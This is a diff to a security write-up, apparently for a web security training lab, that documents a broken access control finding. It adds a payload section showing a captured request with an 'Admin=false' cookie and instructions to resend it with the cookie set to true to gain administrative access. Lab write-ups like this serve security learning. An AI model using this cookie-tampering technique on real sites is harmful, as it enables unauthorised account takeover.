@@ -159,13 +159,33 @@ role=administrator
 - Account takeover
 - Administrative access
 
-  **Screenshot**
+**Screenshot**
 
-  [Request Parameter]()
+
+![Request Parameter](./request_param.png)
+
+
+**Payload**
+
+  ```
+  1.Capture the traffic while logged on like a normal user
+  2.Then the request look like this:
+  GET /my-account?id=wiener HTTP/2
+   Host: 0adb003f0422c9ac80c1e56500690058.web-security-academy.net
+   Cookie: Admin=false; session=9Cq1GDNqjq85V7jFXV3BOImgtozWiPFA
+   Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
+   Sec-Ch-Ua-Mobile: ?0
+   Sec-Ch-Ua-Platform: "Linux"
+   Accept-Language: en-US,en;q=0.9
+
+   `You send request by changing the admin cookie as true
+
+  ```
 
 ### F4 – Role Modified in Profile
 
 **Severity:** Critical
+
 **Type:** Broken Access Control
 
 #### Description
